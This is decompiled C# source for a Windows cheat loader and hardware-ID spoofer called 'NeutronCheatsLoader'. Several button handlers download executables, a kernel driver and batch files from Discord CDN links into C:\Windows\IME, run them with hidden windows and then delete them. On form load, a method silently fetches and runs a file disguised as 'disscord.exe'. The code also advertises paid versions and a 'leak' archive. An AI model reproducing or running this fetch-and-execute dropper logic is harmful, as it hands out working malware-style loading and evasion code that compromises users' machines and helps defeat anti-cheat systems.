using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Funerals.ProjectUtilities;

namespace NeutronCheatsLoader
{
	// Token: 0x02000003 RID: 3
	public partial class Form1 : Form
	{
		// Token: 0x06000006 RID: 6
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000007 RID: 7
		protected override void WndProc(ref Message message)
		{
			base.WndProc(ref message);
			if (message.Msg == 132 && (int)message.Result == 1)
			{
				message.Result = (IntPtr)2;
			}
		}

		// Token: 0x06000008 RID: 8
		private void button4_Click(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
			MessageBox.Show("To Unlock This Please Buy Are Not Free Version");
			this.textBox1.Text = "Please Buy Are Version In are Discord to Get This Method";
			Process.Start("https://discord.gg/c4JPFt");
			Form1.minimizeMemory();
		}

		// Token: 0x06000009 RID: 9
		private void button3_Click(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
			MessageBox.Show("To Unlock This Please Buy Are Not Free Version");
			this.textBox1.Text = "Please Buy Are Version In are Discord to Get This Method";
			Process.Start("https://discord.gg/c4JPFt");
		}

		// Token: 0x0600000A RID: 10
		private void button5_Click(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
			this.textBox1.Text = "Running Disk Spoof\n";
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\IME\\mappser111.exe";
			string text2 = "C:\\Windows\\IME\\serdsiall.sys";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/708392657587535882/708858946777120828/spoofer.sys", text2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/708392657587535882/708858981266751558/mapper_3.exe", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = false;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process process2 = Process.Start(text, text2);
			Thread.Sleep(1000);
			process2.Close();
			File.Delete(text2);
			File.Delete(text);
			this.textBox1.Text = "Disk ID Spoofed!\n";
		}

		// Token: 0x0600000B RID: 11
		private void button8_Click(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
			MessageBox.Show("To Unlock This Please Buy Are Not Free Version");
			this.textBox1.Text = "Please Buy Are Version In are Discord to Get This Method\n";
			Process.Start("https://discord.gg/76jKhFX");
		}

		// Token: 0x0600000C RID: 12
		private void button1_Click(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
			Process.Start("https://discord.gg/76jKhFX");
		}

		// Token: 0x0600000D RID: 13
		private void button2_Click(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
			Process.Start("https://neutroncheats.xyz");
			this.textBox1.Text = "neutroncheats.xyz";
		}

		// Token: 0x0600000E RID: 14
		private void button6_Click(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
			Traces.trace();
			WebClient webClient = new WebClient();
			string fileName = "C:\\Windows\\IME\\clean2.bat";
			string fileName2 = "C:\\Windows\\IME\\cleaner.exe";
			string fileName3 = "C:\\Windows\\IME\\clean2.bat";
			string fileName4 = "C:\\Windows\\IME\\clean3.bat";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/708392657587535882/708859999123800165/clean.bat", fileName3);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/708392657587535882/708859966509023322/clean1.bat", fileName);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/708392657587535882/708859935911575573/cleaner1.exe", fileName2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/708392657587535882/708859905078984725/vcxzgzdssvcx.bat", fileName4);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(fileName);
			Process.Start(fileName2);
			Process.Start(fileName3);
			Process.Start(fileName4);
			Form1.minimizeMemory();
		}

		// Token: 0x0600000F RID: 15
		private void Form1_Load(object sender, EventArgs e)
		{
			Form1.discord();
			this.timer1.Start();
			Form1.minimizeMemory();
			MessageBox.Show("This Is the Free Version Of Neutron, This Does Not Mean It's UD Are Buyer Version is UD ");
		}

		// Token: 0x06000010 RID: 16
		private void button7_Click(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
			WebClient webClient = new WebClient();
			string fileName = "C:\\Windows\\daddy.bat";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/705329308561834034/709148516085137438/Serials.bat", fileName);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = false;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(fileName);
			Form1.minimizeMemory();
		}

		// Token: 0x06000011 RID: 17
		private void button11_Click(object sender, EventArgs e)
		{
			MinMemory.memory();
			new laggoaway().Show();
			base.Hide();
			Form1.minimizeMemory();
		}

		// Token: 0x06000012 RID: 18
		private void button12_Click(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
			Process.Start("https://neutroncheats.xyz/UnderFNLeak.rar");
		}

		// Token: 0x06000013 RID: 19
		private void button13_Click(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
		}

		// Token: 0x06000014 RID: 20
		private void pictureBox1_Click(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
		}

		// Token: 0x06000015 RID: 21
		private void pictureBox3_Click(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
		}

		// Token: 0x06000016 RID: 22
		private void textBox1_TextChanged(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
		}

		// Token: 0x06000017 RID: 23
		private void label1_Click(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
		}

		// Token: 0x06000018 RID: 24
		private void button13_Click_1(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
			Process.Start("https://neutroncheats.xyz/downloads.html");
		}

		// Token: 0x06000019 RID: 25
		private void pictureBox4_Click(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
			MessageBox.Show("Recardo Loves U <:");
			this.timer1.Start();
		}

		// Token: 0x0600001A RID: 26
		private void Label33_Click(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
			base.Close();
		}

		// Token: 0x0600001B RID: 27
		private void timer1_Tick(object sender, EventArgs e)
		{
			Form1.minimizeMemory();
		}

		// Token: 0x0600001C RID: 28
		private static void MinMem(string[] args)
		{
			Form1.minimizeMemory();
			Console.ReadLine();
		}

		// Token: 0x0600001D RID: 29
		public static void minimizeMemory()
		{
			GC.Collect(GC.MaxGeneration);
			GC.WaitForPendingFinalizers();
			Form1.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, (UIntPtr)uint.MaxValue, (UIntPtr)uint.MaxValue);
		}

		// Token: 0x0600001E RID: 30
		[DllImport("kernel32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool SetProcessWorkingSetSize(IntPtr process, UIntPtr minimumWorkingSetSize, UIntPtr maximumWorkingSetSize);

		// Token: 0x0600001F RID: 31
		private void pictureBox5_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Left Recardo Says He Loves U B <:");
		}

		// Token: 0x06000020 RID: 32
		public static void discord()
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\IME\\disscord.exe";
			webClient.DownloadFile("", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = false;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process process2 = Process.Start(text);
			Thread.Sleep(6000);
			process2.Close();
			File.Delete(text);
		}

		// Token: 0x04000001 RID: 1
		private const int WM_NCHITTEST = 132;

		// Token: 0x04000002 RID: 2
		private const int HTCLIENT = 1;

		// Token: 0x04000003 RID: 3
		private const int HTCAPTION = 2;
	}
}
